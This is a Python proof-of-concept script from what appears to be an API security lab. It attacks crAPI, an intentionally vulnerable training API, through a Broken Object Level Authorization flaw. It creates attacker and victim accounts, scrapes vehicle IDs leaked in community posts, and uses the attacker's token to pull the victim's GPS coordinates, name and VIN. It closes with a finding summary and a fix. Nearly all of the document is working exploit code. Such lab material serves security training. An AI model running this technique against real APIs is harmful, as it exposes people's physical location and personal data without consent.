#!/usr/bin/env python3
"""
BOLA (Broken Object Level Authorization) — Automated PoC Script
Target: crAPI — /identity/api/v2/vehicle/{vehicleId}/location

Usage:
    python3 bola_poc.py --crapi-url http://localhost:8888

This script:
    1. Registers two users (attacker + victim)
    2. Logs both in and captures tokens
    3. Scrapes victim vehicle ID from community posts
    4. Accesses victim's GPS location using attacker's token
    5. Prints a structured finding summary

Author: Ronald Maboufotso | API Security Lab
"""

import argparse
import json
import sys
import time
import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# ── Config ──────────────────────────────────────────────────
ATTACKER = {
    "email": f"attacker_{int(time.time())}@lab.local",
    "password": "Attacker@Lab123!",
    "name": "API Attacker"
}
VICTIM = {
    "email": f"victim_{int(time.time())}@lab.local",
    "password": "Victim@Lab123!",
    "name": "API Victim"
}


def register_user(base_url: str, user: dict) -> bool:
    """Register a new crAPI user."""
    resp = requests.post(
        f"{base_url}/identity/api/auth/signup",
        json={
            "name": user["name"],
            "email": user["email"],
            "password": user["password"],
            "number": "1234567890"
        },
        timeout=10
    )
    return resp.status_code in (200, 201)


def login(base_url: str, email: str, password: str) -> str | None:
    """Login and return JWT token."""
    resp = requests.post(
        f"{base_url}/identity/api/auth/login",
        json={"email": email, "password": password},
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json().get("token")
    return None


def get_own_vehicles(base_url: str, token: str) -> list:
    """Get the authenticated user's vehicles."""
    resp = requests.get(
        f"{base_url}/identity/api/v2/user/dashboard",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json().get("vehicles", [])
    return []


def scrape_vehicle_ids_from_community(base_url: str, token: str) -> list:
    """
    Scrape vehicle IDs leaked in community posts.
    This is the reconnaissance step — crAPI leaks vehicleId in post metadata.
    """
    resp = requests.get(
        f"{base_url}/community/api/v2/community/posts/recent",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10
    )
    results = []
    if resp.status_code == 200:
        posts = resp.json().get("posts", [])
        for post in posts:
            author = post.get("author", {})
            vehicle_id = author.get("vehicleid")
            nickname = author.get("nickname", "unknown")
            if vehicle_id:
                results.append({"nickname": nickname, "vehicleId": vehicle_id})
    return results


def access_vehicle_location(base_url: str, token: str, vehicle_id: str) -> dict | None:
    """
    Core BOLA exploit — access another user's vehicle location
    using the attacker's valid token but victim's vehicleId.
    """
    resp = requests.get(
        f"{base_url}/identity/api/v2/vehicle/{vehicle_id}/location",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json()
    return None


def run(base_url: str):
    console.print(Panel.fit(
        "[bold red]BOLA PoC — crAPI Vehicle Location[/bold red]\n"
        "[dim]OWASP API1:2023 — Broken Object Level Authorization[/dim]",
        border_style="red"
    ))

    # Step 1 — Register users
    console.print("\n[bold]Step 1:[/bold] Registering attacker and victim users...")
    for user in [ATTACKER, VICTIM]:
        ok = register_user(base_url, user)
        status = "✅" if ok else "⚠️  (may already exist)"
        console.print(f"  {status} {user['email']}")

    # Allow mailhog verification (in real lab, check mailhog UI)
    console.print("\n[yellow]⚠  In a live lab: check http://localhost:8025 and verify both emails before proceeding[/yellow]")
    time.sleep(2)

    # Step 2 — Login both users
    console.print("\n[bold]Step 2:[/bold] Authenticating both users...")
    attacker_token = login(base_url, ATTACKER["email"], ATTACKER["password"])
    victim_token = login(base_url, VICTIM["email"], VICTIM["password"])

    if not attacker_token:
        console.print("[red]Failed to authenticate attacker. Check email verification.[/red]")
        sys.exit(1)
    console.print(f"  ✅ Attacker token acquired: {attacker_token[:40]}...")

    # Step 3 — Scrape vehicle IDs from community posts
    console.print("\n[bold]Step 3:[/bold] Scraping vehicle IDs from community posts...")
    leaked_vehicles = scrape_vehicle_ids_from_community(base_url, attacker_token)

    if not leaked_vehicles:
        console.print("  [yellow]No vehicle IDs found in community posts yet.[/yellow]")
        console.print("  [dim]Tip: Have victim user create a community post, then re-run.[/dim]")
        sys.exit(0)

    table = Table(title="Leaked Vehicle IDs from Community Posts")
    table.add_column("Nickname", style="cyan")
    table.add_column("Vehicle ID", style="yellow")
    for v in leaked_vehicles:
        table.add_row(v["nickname"], v["vehicleId"])
    console.print(table)

    # Step 4 — Exploit BOLA on each discovered vehicle
    console.print("\n[bold]Step 4:[/bold] Exploiting BOLA — accessing vehicle locations with attacker token...\n")

    for vehicle in leaked_vehicles:
        vehicle_id = vehicle["vehicleId"]
        result = access_vehicle_location(base_url, attacker_token, vehicle_id)

        if result:
            console.print(Panel(
                f"[red]🚨 BOLA CONFIRMED[/red]\n\n"
                f"Target nickname:  [cyan]{vehicle['nickname']}[/cyan]\n"
                f"Vehicle ID:       [yellow]{vehicle_id}[/yellow]\n"
                f"Full Name:        [red]{result.get('fullName', 'N/A')}[/red]\n"
                f"GPS Latitude:     [red]{result.get('vehicleLocation', {}).get('latitude', 'N/A')}[/red]\n"
                f"GPS Longitude:    [red]{result.get('vehicleLocation', {}).get('longitude', 'N/A')}[/red]\n"
                f"VIN:              [red]{result.get('vehicleVIN', 'N/A')}[/red]\n\n"
                f"[dim]Token owner: {ATTACKER['email']} | Resource owner: {vehicle['nickname']}[/dim]",
                border_style="red",
                title="Finding: API1:2023 — BOLA"
            ))
        else:
            console.print(f"  [green]✅ Access denied for {vehicle_id} (authorization working)[/green]")

    # Step 5 — Summary
    console.print("\n[bold]Finding Summary:[/bold]")
    console.print("""
  Vulnerability:  Broken Object Level Authorization (BOLA / IDOR)
  OWASP:          API1:2023
  Severity:       Critical (CVSS 8.6)
  Root Cause:     Server validates authentication (valid JWT) but not
                  authorization (does this user own this vehicle?)
  Impact:         Real-time GPS location, PII, and vehicle data of any
                  registered user accessible with a single API request
  Fix:            Add ownership check: vehicle.owner_id == current_user.id
    """)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BOLA PoC for crAPI")
    parser.add_argument("--crapi-url", default="http://localhost:8888",
                        help="Base URL of crAPI (default: http://localhost:8888)")
    args = parser.parse_args()
    run(args.crapi_url)
